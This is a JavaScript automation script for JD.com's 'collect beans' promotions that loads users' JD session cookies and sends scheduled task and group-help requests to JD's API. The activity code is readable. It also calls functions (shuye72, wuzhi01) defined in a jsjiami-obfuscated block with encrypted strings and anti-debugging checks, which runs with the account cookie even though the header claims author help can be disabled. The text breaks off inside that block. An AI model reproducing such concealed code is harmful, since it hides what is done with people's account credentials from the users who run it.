/*
领京豆额外奖励&抢京豆
脚本自带助力码，介意者可将 29行 helpAuthor 变量设置为 false
活动入口：京东APP首页-领京豆
更新地址：https://gitee.com/lxk0301/jd_scripts/raw/master/jd_bean_home.js
已支持IOS双京东账号, Node.js支持N个京东账号
脚本兼容: QuantumultX, Surge, Loon, 小火箭，JSBox, Node.js
============Quantumultx===============
[task_local]
#领京豆额外奖励
10 7 * * * https://gitee.com/lxk0301/jd_scripts/raw/master/jd_bean_home.js, tag=领京豆额外奖励, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jd_bean_home.png, enabled=true

================Loon==============
[Script]
cron "10 7 * * *" script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_bean_home.js, tag=领京豆额外奖励

===============Surge=================
领京豆额外奖励 = type=cron,cronexp="10 7 * * *",wake-system=1,timeout=3600,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_bean_home.js

============小火箭=========
领京豆额外奖励 = type=cron,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_bean_home.js, cronexpr="10 7 * * *", timeout=3600, enable=true
 */
const $ = new Env('领京豆额外奖励');

const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let jdNotify = true;//是否关闭通知，false打开通知推送，true关闭通知推送
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '', message;
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {
  };
} else {
  let cookiesData = $.getdata('CookiesJD') || "[]";
  cookiesData = jsonParse(cookiesData);
  cookiesArr = cookiesData.map(item => item.cookie);
  cookiesArr.reverse();
  cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
  cookiesArr.reverse();
  cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
}
const JD_API_HOST = 'https://api.m.jd.com/';
!(async () => {
  $.newShareCodes = []
  // await getAuthorShareCode();
  // await getAuthorShareCode2();
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      message = '';
      await TotalBean();
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      await jdBeanHome();
    }
  }
  // for (let i = 0; i < cookiesArr.length; i++) {
  //   if (cookiesArr[i]) {
  //     $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
  //     console.log(`${$.UserName}去帮助下一个人`)
  //     cookie = cookiesArr[i];
  //     if ($.newShareCodes.length > 1) {
  //       let code = $.newShareCodes[(i + 1) % $.newShareCodes.length]
  //       await help(code[0], code[1])
  //     }
  //     if (helpAuthor && $.authorCode) {
  //       console.log(`去帮助作者`)
  //       const helpRes = await help($.authorCode[0], $.authorCode[1])
  //       if (helpRes && helpRes.data.respCode === 'SG209') {
  //         console.log(`助力次数已耗尽，跳出助力`)
  //         break;
  //       }
  //     }
  //     if (helpAuthor && $.authorCode2) {
  //       for (let code of $.authorCode2) {
  //         const helpRes = await help(code.shareCode, code.groupCode);
  //         if (helpRes && helpRes.data.respCode === 'SG209') {
  //           console.log(`助力次数已耗尽，跳出助力`)
  //           break;
  //         }
  //       }
  //     }
  //   }
  // }
})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

async function jdBeanHome() {
  await shuye72()
  $.doneState = false
  // for (let i = 0; i < 3; ++i) {
  //   await doTask2()
  //   await $.wait(1000)
  //   if ($.doneState) break
  // }
  do {
    await doTask2()
    await $.wait(3000)
  } while (!$.doneState)
  await $.wait(1000)
  await award("feeds")
  await $.wait(1000)
  await getUserInfo()
  await $.wait(1000)
  await getTaskList()
  await getTaskList();
  await receiveJd2();
  await showMsg();
}

function getRandomInt(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min)) + min;
}
function doTask2() {
    return new Promise(resolve => {
      const body = {"awardFlag": false, "skuId": `${getRandomInt(10000000,20000000)}`, "source": "feeds", "type": '1'};
      $.post(taskUrl('beanHomeTask', body), (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if (data.code === '0' && data.data){
                console.log(`任务完成进度：${data.data.taskProgress} / ${data.data.taskThreshold}`)
                if(data.data.taskProgress === data.data.taskThreshold)
                  $.doneState = true
              } else if (data.code === '0' && data.errorCode === 'HT201') {
                $.doneState = true
              } else {
                //HT304风控用户
                $.doneState = true
                console.log(`做任务异常：${JSON.stringify(data)}`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve();
        }
      })
    })
}

function getAuthorShareCode() {
  return new Promise(resolve => {
    $.get({url: "",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
        } else {
          $.authorCode = data.replace('\n', '').split(' ')
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function getAuthorShareCode2() {
  return new Promise(resolve => {
    $.get({url: "",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
        } else {
          if (safeGet(data)) {
            $.authorCode2 = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function getUserInfo() {
  return new Promise(resolve => {
    $.post(taskUrl('signBeanGroupStageIndex', 'body'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if(data.data.jklInfo) {
              $.actId = data.data.jklInfo.keyId
              let {shareCode, groupCode} = data.data
              if (!shareCode) {
                console.log(`未获取到助力码，去开团`)
                await hitGroup()
              } else {
                console.log(shareCode, groupCode)
                // 去做逛会场任务
                if (data.data.beanActivityVisitVenue.taskStatus === '0') {
                  await help(shareCode, groupCode, 1)
                }
                $.newShareCodes.push([shareCode, groupCode])
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function hitGroup() {
  return new Promise(resolve => {
    const body = {"activeType": 2,};
    $.get(taskGetUrl('signGroupHit', body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.data.respCode === "SG150") {
              let {shareCode, groupCode} = data.data.signGroupMain
              if (shareCode) {
                $.newShareCodes.push([shareCode, groupCode])
                console.log('开团成功')
                await help(shareCode, groupCode, 1)
              } else {
                console.log(`为获取到助力码，错误信息${JSON.stringify(data.data)}`)
              }
            } else {
              console.log(`开团失败，错误信息${JSON.stringify(data.data)}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function help(shareCode, groupCode, isTask = 0) {
  return new Promise(resolve => {
    const body = {
      "activeType": 2,
      "groupCode": groupCode,
      "shareCode": shareCode,
      "activeId": $.actId,
    };
    if (isTask) {
      console.log(`【抢京豆】做任务获取助力`)
      body['isTask'] = "1"
    } else {
      console.log(`【抢京豆】去助力好友${shareCode}`)
      body['source'] = "guest"
    }
    $.get(taskGetUrl('signGroupHelp', body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`【抢京豆】${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            console.log(`【抢京豆】${data.data.helpToast}`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
var _0xodu='jsjiami.com.v6',_0x2846=[_0xodu,'GhLDuMKe6K245rGs5aWs6LW677++6K+b5qKP5pyy57yO6LSO6Ya76K2s','e8OTesOoQw==','w4PCtFo4w4TDnA==','wolnw7U4w64=','woNjw4c0w4E=','w5jCi342w58=','w7fCqTNSKg==','w6R+JgDCqA==','w5UJCmjDqg==','w7oRw4XDlirCiXjDjMKowq93CQ==','djDDphzCssKHw70tA8KIw4zDncOdXcKgwovCuUsELsKzGybDjcKtwpfDuMOew7RNw4Rbw5c=','w79UNT/CjkBcwoLCphjDm8KgTMK8b8K7w7PDgg8qw73DmcOLwp3DollsUxkLHnLDoQ==','woXCg8Kpw5wdcDc5EsKzAsOfO8KbY8K+woRyN8KNem3DkCDCshDDqcOW','wrbDlsOAw6xJ','wrALDwDCuHZuwrPCnSjDtMOIccOfTMKf','w7YKVTc=','WcOvw5/CksOHMhIfF8KgwqzCksK9LU7DljpiwqLDl3DDjMK2ecOhPXYbw5YHw4FRw5DDnVRFfmLDuwDDtg5Nwp7Ch1bCunzClsKEU07DhcOPwqfCtMO5HsKaw6k3L1UNPsOFPGzDmh/ChFl4F8K8w4jCsFfDsC5BwpBMwr5ndQNKw6pwHcKKLVjCtcOtw4XCunUAw60kw53Dq0vDuMO6w7gtwrPDisKuw4UXb0zCiShPE8ONNcOaw7XDj8OrC3zDjsKZC8KhRn8+TcOYFsKEJ8KNEHzCgsKcSCHDo2/CllBuwr0i','w7MVw5jCiDTCnT3Ch8OvwqJuDS/Dr8O8L8Kkw7nDisOJw6rClcKELcOndsOnLl0=','bMOsEMOIZg==','woDCuMKTwpHDlQ==','a8OXMMOeeg==','KsKPw7EOwroq','wopyw6rDu8K5EMOySUk=','UifDnMKnw7wUcnDCk1wmw7kyw48cw53Dn8K+w6jDvC0pVMOG','bsKudnfCmQ==','woBQw4TDg8Kb','RidDFcOM','w45adgPDig==','w48GaBHCnQ==','w6HCv8O6w74Jwoo=','wrgDwrI=','wp3CqVbDisKkMTIaYXA+TsOm','w5zDjkI=','SsKJb2vCncORQcKZeVfDkcOgwqQ=','eQVXBcOW','wpvCr8K6w740','woLCqUzDjcKoNScAbmM=','w57DhUAADHYW','D21Hw71n','GcOgw4/CmsOSJwM=','YzHDscK8w6g=','w5TCg30fcg==','wqdtw4nDhMK5','GMOww5XCncOHOg0BZcKtw4HCusK3YBTCjG4Kw6DChSTClsO8DMKqOkAKw5Mew5pZwprCjF9McyDCixTCrgpEwobCjhbDq3DCnMKGGlPDocOLwq3Dq8KQM8K8w5VjBUdOe8KYFTHCjgrDjx4/U8KQw53CslXChQZDwqELw6hPcRZUw59OFsOKXBM=','woZjPwHCly1Pw6XCvsOkXCvCnRxUCsOGwp5UwoIqw5rCgT7DswvClMK/wrdKw6YbwqbDkcOjUAjCg8KIwopYFR/DqGMqDsOhwqQKPAQQJ8KfTcKiwqgMc8O/wrPCnD7DrsOBYGZ7McO/ETPDlsOMTcOkf8Kfw47ClcOAd8Kywo7DlCA3WsOnRlTDosOYwo0Tw5PDg2HCnCnDqSIxw7HCvkrCqcOiPsOBw4HCqDTDssO0wqtsHcK9w5rCnsOXXsKAwr8tDcK/w4nDoMOYwrTCjyfCjig+EGhwZ8OlwoPDpRF9PW7CsmbCpRlmwqscCXw2w79YRcOjw5gvITFQekXCs8KVCMOrbMK7FCTCvMOTwopcwpFHw4XDtsO+TFo9w7kaTkvCrBHDsD7Dg2x9KS3Dh8K6SsOpGXDCvMOqCD11Y8Ovwr/CgsKvwrLCqHLCg8K8wr7ClCHDvwpTwonDnsO+NxgzXjLCqEzDtMKCSTpGD8K2wq0FWwHDvTR+aRV7woYNXGnCiMKUwp3Coy1F','w6PCpGAu','K8KMfcObKA==','w4rCo8Olw7sF','ScOjOcOSGg==','RsK9wrk=','w5ATw6jCkA==','TyHCqnzorrzms7HlpYPotrHvvY/orYDmoq7mnLnnvp3otorphbfor40=','w7HCoVIwcRM=','w4NjexHDjg==','wo3Cr2jDqMKW','w7Fdw4ZowqU=','wqAfWcKIw5Fy','F8K/VcO5Hw==','RsK9wrk4V1c=','XBvDisK1w6Q=','wq0RecKZw48=','w50paVjCoTIdwrhlM8OmGg==','ck5UCsKSTEJawrnCm8OtYcOHwqLDlDnCsAjClARDwoDCs8Kxw5nCvcOdZn3DscKJw43Drw==','YTlGEMORw7wmcMKUwrQMdFYzAlPCiCkTw7oCBzfCkcKewqIUFl7DlsOUw6EN','Y8O4HMOIAcOCwpzDqcKJw5DDrXwEwprDt19ZEhAiwrQuw5wkwrE=','wpfCn8Oww48A','JSclKw4ZaA7DvghsPMO5wrHCrcK9','DMKzw4MK','KMOoJcOgW8O0wopwdl9Lwp5+FsKWfhYYSsKdM1FYwqfDmMK1wqfDmsKmHcK3KmlUJzbDjMKRI8KENhrCnMOlY8K6wqoNewnDkcOZw6LDlmxseMOYDy13wojDlCJTw4NiQDljwr1vMMOKwpnDoMO3R2Z2wqfCg8K6bcOBS8KWLMOnVMOFwqDCn3rDocOKwoLCh0bClAXDmsOZesOgwozDsTzCtcOdD8OyaWrDkcKAwrTDoklyccOewqnDoCcOV8Kxwp/Cs2DCvRPDhHQPJSPCiCDDh2M2I3rDlDgewqsEIwvDrsKQ','woFPw7/DmcKi','TDjClGPCrw==','ZsKGb3jCmQ==','w6ZfVynDqMKUw6JGw40=','w7XCukEFcFvCvGLDi2LDiMKECcOFwrrCtwDDisK1K1E8F8KR','VmZePsK0','ZxAsSGU=','w6Uqeg/DlQ==','w5vCvcOEwrJa','w4YLZwHDgg==','YnshFzUp','wojCmcKr','QcOfN8OtIcK9w6HCmcKpw6TDm1s3','w5Bew4k=','QVswLQIJaRTDrRBoNcOo','w5fCiHcVdw==','bsKAa2TCpg==','w4jCnXAnXCDDlAjDpEY=','cCXDohTCusKQw70=','w68QZDjCmA==','wqvDm8KZw6tGwqTCsg==','U8KTVHDCmg==','R8ObY8OCVA==','wr/Cjn3Dr8KETk9qQUQIacOVw57CnB/CvMK6wrLDjsK1I8Ouw6vDq8OLw4Zkw4oXDQJawqLDnMK4Pg==','wpXDhMOWw6XDgG5CLcOvZ8KJwp9hwoZsZcOgAMKldmtBw5s4JiV6wocrQsOpBcKOwrd2QC8yeg7DvcO3wrBYw4PClEXDhsOmYMOmYsKzWcKqd8Oiw7gAeUd0w6zDhMOSJ8KrNhTCom7CoMK5UMKSMSLChcKswr4IwrdxQsOYw4YCGgcdwrvCmcOoNR5Lw64Nw53Cm8Kqw4tpwow6Mwcnw6PCsMKRw601TA==','binCnW3Csg==','PsOUDVduw5x4dGhGw5rCqX7DrMOtCsOVw7tKFmAZwqVPw7MMw7Y1wrHCqyXDi8KdJTfCs2tzwoMCwoXDlXE=','w5QgbhY=','UMOxMHHCkA==','w5MsdgfCnA==','fSzDogjCsQ==','asK2REbCpA==','JQjCpg==','AQHCl1A=','w4Ndw4zDm+isuuawt+Wmsei0pe+8oeivueahuOacjee9vui1hemHqOismg==','w79QUzPDuQ==','EsOqw5zCu8OBIQ==','wqLCpMK2w4kn','w6oBWRLCjg==','cQ3DjijCjg==','w6/DiVsFGQ==','CTLCvXYR','w7JTw5N7wqE=','w5LCtsOwwppZ','w5QtdAbCvyZYw7MsOcO9EnHDvm7DrsKGwoPDizTClsK1w5cSwqMiJMOXw6QGw5bDpx57woJlwoEKw6VWwr/CmMOdMHjDhD3DoMKQw6DCmMKRw4ZAN2HDscKjwoh+fcKweksUMgkxRsKI','w6LCtEcUw5rDgkw6w4/CphbCjzLCuMOKNcKhw7w/w7LCu8OYw6cxK8KNY8KNw69Zw6vDlwZBL8Ocw6sEwrYEe8OpVwvCpC03w4RhwpbCpsODw451HcOPfFZDXzF+acKMIixLw4HChC/DgRHDjsOQNDQAPcKqEcOYwrRCG8KUw5fDvcOXw5w6EMKZw6UgSGHCvW/Cj8KCJShEKgwwwpcLDhXDhiFLeQEHw4XDrcKfKAXDiw/CocOyw5BGwoXCo8OgIBfDoDTCvcKKF8O1d8O8aA5hTsOjdz3CicObwprCtcKKaXvCpMOb','w6ZhaSzDuA==','w5nCqsOywqdo','W8OqPWXCvQ==','f8OjM8O/Sg==','MWpq','w7J8w4xpCw==','wqZDw4ctw4Q=','UyvDojHCtQ==','YV47EDM=','Rws2V2M=','w4PCtFo=','w4oucAc=','wpnDoWQt6K6a5rGA5aWG6LWd77+K6Ky95qG45p6K57y46Le26YSn6K2n','TMORLQ==','bsK7XVs=','w5PDsMOow4/orYPmsYXlpJzotabvvqror7TmobTmnK7nvZHotJrph4ror7k=','w5oTw7HClGwGHQ==','OQbCs8OVwrs=','w7YXehnDoQ==','wpTCssKjwofDviPCvw==','c8OHNXPCrcOa','w5XCssOHwoFF','WMKHwpg+ZA==','wr4leMKOw6I=','LV7CpsKvwqo=','cyHDohHCnMKBw6g=','UzlTGcOc','bCxYG8OMw7c=','wqgRSsKsw6RlEw==','w6ZAw5pPwoc=','CcOkw5LCig==','WsKSWlLCug==','G3DDr34=','SXZOCsKP','w4ggeg==','w5fDgVkB','jsjiEhaLmCi.MfAncAQUBotmy.v6=='];(function(_0x1df2e4,_0x4dfe90,_0x23dbaf){var _0x48bccc=function(_0x361745,_0x408b25,_0x5d7916,_0x120513,_0x3af87f){_0x408b25=_0x408b25>>0x8,_0x3af87f='po';var _0x4aeaee='shift',_0x38b1a6='push';if(_0x408b25<_0x361745){while(--_0x361745){_0x120513=_0x1df2e4[_0x4aeaee]();if(_0x408b25===_0x361745){_0x408b25=_0x120513;_0x5d7916=_0x1df2e4[_0x3af87f+'p']();}else if(_0x408b25&&_0x5d7916['replace'](/[EhLCMfAnAQUBty=]/g,'')===_0x408b25){_0x1df2e4[_0x38b1a6](_0x120513);}}_0x1df2e4[_0x38b1a6](_0x1df2e4[_0x4aeaee]());}return 0x779ab;};var _0x24c905=function(){var _0x4ce5f5={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x577402,_0x246a3f,_0x2b891c,_0x1794ca){_0x1794ca=_0x1794ca||{};var _0x3b2058=_0x246a3f+'='+_0x2b891c;var _0x30fb34=0x0;for(var _0x30fb34=0x0,_0x96b67e=_0x577402['length'];_0x30fb34<_0x96b67e;_0x30fb34++){var _0x23ef14=_0x577402[_0x30fb34];_0x3b2058+=';\x20'+_0x23ef14;var _0x26764e=_0x577402[_0x23ef14];_0x577402['push'](_0x26764e);_0x96b67e=_0x577402['length'];if(_0x26764e!==!![]){_0x3b2058+='='+_0x26764e;}}_0x1794ca['cookie']=_0x3b2058;},'removeCookie':function(){return'dev';},'getCookie':function(_0x1f52ac,_0x5f5565){_0x1f52ac=_0x1f52ac||function(_0x4fc0bc){return _0x4fc0bc;};var _0x1873dd=_0x1f52ac(new RegExp('(?:^|;\x20)'+_0x5f5565['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x41e665=typeof _0xodu=='undefined'?'undefined':_0xodu,_0x2db9ff=_0x41e665['split'](''),_0x134aa8=_0x2db9ff['length'],_0x1b2cdc=_0x134aa8-0xe,_0x51a90f;while(_0x51a90f=_0x2db9ff['pop']()){_0x134aa8&&(_0x1b2cdc+=_0x51a90f['charCodeAt']());}var _0x57e289=function(_0x25eee1,_0x2745a4,_0x9f6f09){_0x25eee1(++_0x2745a4,_0x9f6f09);};_0x1b2cdc^-_0x134aa8===-0x524&&(_0x51a90f=_0x1b2cdc)&&_0x57e289(_0x48bccc,_0x4dfe90,_0x23dbaf);return _0x51a90f>>0x2===0x14b&&_0x1873dd?decodeURIComponent(_0x1873dd[0x1]):undefined;}};var _0x4a6d2a=function(){var _0x10fc1=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x10fc1['test'](_0x4ce5f5['removeCookie']['toString']());};_0x4ce5f5['updateCookie']=_0x4a6d2a;var _0x8272e2='';var _0x5c548c=_0x4ce5f5['updateCookie']();if(!_0x5c548c){_0x4ce5f5['setCookie'](['*'],'counter',0x1);}else if(_0x5c548c){_0x8272e2=_0x4ce5f5['getCookie'](null,'counter');}else{_0x4ce5f5['removeCookie']();}};_0x24c905();}(_0x2846,0x1c9,0x1c900));var _0x84d0=function(_0x6691e8,_0x12f4a3){_0x6691e8=~~'0x'['concat'](_0x6691e8);var _0x242ea8=_0x2846[_0x6691e8];if(_0x84d0['PEEsmm']===undefined){(function(){var _0x2d7420;try{var _0x37d058=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x2d7420=_0x37d058();}catch(_0x52f52d){_0x2d7420=window;}var _0x2d493d='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x2d7420['atob']||(_0x2d7420['atob']=function(_0x1dd688){var _0x1f802b=String(_0x1dd688)['replace'](/=+$/,'');for(var _0x35e1af=0x0,_0x7b1713,_0x3db73d,_0xb64c64=0x0,_0x2990e1='';_0x3db73d=_0x1f802b['charAt'](_0xb64c64++);~_0x3db73d&&(_0x7b1713=_0x35e1af%0x4?_0x7b1713*0x40+_0x3db73d:_0x3db73d,_0x35e1af++%0x4)?_0x2990e1+=String['fromCharCode'](0xff&_0x7b1713>>(-0x2*_0x35e1af&0x6)):0x0){_0x3db73d=_0x2d493d['indexOf'](_0x3db73d);}return _0x2990e1;});}());var _0xadad78=function(_0x45169e,_0x12f4a3){var _0x2276dc=[],_0x32f3a3=0x0,_0x3a26d1,_0xd387e2='',_0x2ae28d='';_0x45169e=atob(_0x45169e);for(var _0x41304c=0x0,_0x3c7c2c=_0x45169e['length'];_0x41304c<_0x3c7c2c;_0x41304c++){_0x2ae28d+='%'+('00'+_0x45169e['charCodeAt'](_0x41304c)['toString'](0x10))['slice'](-0x2);}_0x45169e=decodeURIComponent(_0x2ae28d);for(var _0x46b47e=0x0;_0x46b47e<0x100;_0x46b47e++){_0x2276dc[_0x46b47e]=_0x46b47e;}for(_0x46b47e=0x0;_0x46b47e<0x100;_0x46b47e++){_0x32f3a3=(_0x32f3a3+_0x2276dc[_0x46b47e]+_0x12f4a3['charCodeAt'](_0x46b47e%_0x12f4a3['length']))%0x100;_0x3a26d1=_0x2276dc[_0x46b47e];_0x2276dc[_0x46b47e]=_0x2276dc[_0x32f3a3];_0x2276dc[_0x32f3a3]=_0x3a26d1;}_0x46b47e=0x0;_0x32f3a3=0x0;for(var _0x6013d=0x0;_0x6013d<_0x45169e['length'];_0x6013d++){_0x46b47e=(_0x46b47e+0x1)%0x100;_0x32f3a3=(_0x32f3a3+_0x2276dc[_0x46b47e])%0x100;_0x3a26d1=_0x2276dc[_0x46b47e];_0x2276dc[_0x46b47e]=_0x2276dc[_0x32f3a3];_0x2276dc[_0x32f3a3]=_0x3a26d1;_0xd387e2+=String['fromCharCode'](_0x45169e['charCodeAt'](_0x6013d)^_0x2276dc[(_0x2276dc[_0x46b47e]+_0x2276dc[_0x32f3a3])%0x100]);}return _0xd387e2;};_0x84d0['uDtIDv']=_0xadad78;_0x84d0['xHTuYM']={};_0x84d0['PEEsmm']=!![];}var _0x3e0496=_0x84d0['xHTuYM'][_0x6691e8];if(_0x3e0496===undefined){if(_0x84d0['wPHnFj']===undefined){var _0x552300=function(_0x33e601){this['nvpPhP']=_0x33e601;this['acfcjd']=[0x1,0x0,0x0];this['wEwfdg']=function(){return'newState';};this['nUWdBc']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['aikNpH']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x552300['prototype']['gRRdtq']=function(){var _0x35e467=new RegExp(this['nUWdBc']+this['aikNpH']);var _0xbf689f=_0x35e467['test'](this['wEwfdg']['toString']())?--this['acfcjd'][0x1]:--this['acfcjd'][0x0];return this['TPAmHR'](_0xbf689f);};_0x552300['prototype']['TPAmHR']=function(_0x1c4bf4){if(!Boolean(~_0x1c4bf4)){return _0x1c4bf4;}return this['XEZjsk'](this['nvpPhP']);};_0x552300['prototype']['XEZjsk']=function(_0x72e3a){for(var _0x174abc=0x0,_0x49dfa4=this['acfcjd']['length'];_0x174abc<_0x49dfa4;_0x174abc++){this['acfcjd']['push'](Math['round'](Math['random']()));_0x49dfa4=this['acfcjd']['length'];}return _0x72e3a(this['acfcjd'][0x0]);};new _0x552300(_0x84d0)['gRRdtq']();_0x84d0['wPHnFj']=!![];}_0x242ea8=_0x84d0['uDtIDv'](_0x242ea8,_0x12f4a3);_0x84d0['xHTuYM'][_0x6691e8]=_0x242ea8;}else{_0x242ea8=_0x3e0496;}return _0x242ea8;};var _0x480d8d=function(){var _0x54e8f9=!![];return function(_0x5533cb,_0x4a7ad7){var _0x5d4789=_0x54e8f9?function(){if(_0x4a7ad7){var _0x5c9296=_0x4a7ad7['apply'](_0x5533cb,arguments);_0x4a7ad7=null;return _0x5c9296;}}:function(){};_0x54e8f9=![];return _0x5d4789;};}();var _0x4e09f3=_0x480d8d(this,function(){var _0x290167=function(){return'\x64\x65\x76';},_0x25f055=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x4fba6e=function(){var _0x1cad32=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x1cad32['\x74\x65\x73\x74'](_0x290167['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x4529d1=function(){var _0x35c2a6=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x35c2a6['\x74\x65\x73\x74'](_0x25f055['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x27dae8=function(_0x5f49ae){var _0x13247c=~-0x1>>0x1+0xff%0x0;if(_0x5f49ae['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x13247c)){_0x37a2ad(_0x5f49ae);}};var _0x37a2ad=function(_0x144491){var _0xe3c41=~-0x4>>0x1+0xff%0x0;if(_0x144491['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0xe3c41){_0x27dae8(_0x144491);}};if(!_0x4fba6e()){if(!_0x4529d1()){_0x27dae8('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x27dae8('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x27dae8('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x4e09f3();function wuzhi01(_0x377045){var _0x320f42={'LRZQR':function(_0x4e49ec,_0x23cc54){return _0x4e49ec===_0x23cc54;},'BoQjh':_0x84d0('0','nJQ2'),'ZUawa':_0x84d0('1','&o!6'),'DmyBF':_0x84d0('2','rbLX'),'fHbbk':function(_0x21e601){return _0x21e601();},'pkDwl':_0x84d0('3','m)P!'),'KizGN':_0x84d0('4','[yqN'),'ntFIW':_0x84d0('5','14^x'),'cLXQV':_0x84d0('6','R1lr'),'Fnuit':_0x84d0('7','m)P!'),'AkWCV':_0x84d0('8','tvIN'),'kIusb':_0x84d0('9','qS8G'),'yLayn':function(_0x6b1ce1,_0x3eebf9){return _0x6b1ce1(_0x3eebf9);},'vXgRZ':_0x84d0('a','m)P!'),'YbYkg':_0x84d0('b','ewy0'),'GHnEV':_0x84d0('c','c))w'),'DqUVt':_0x84d0('d','14^x')};return new Promise(_0xbbbd10=>{if(_0x320f42[_0x84d0('e','#uH!')](_0x320f42[_0x84d0('f','BvM]')],_0x320f42[_0x84d0('10','#uH!')])){$[_0x84d0('11','pcRw')](e,resp);}else{let _0x1825f1=+new Date();let _0x446bf9=_0x377045[_0x84d0('12','Y4WG')];let _0x1774bb={'url':_0x84d0('13','sBs4')+ +new 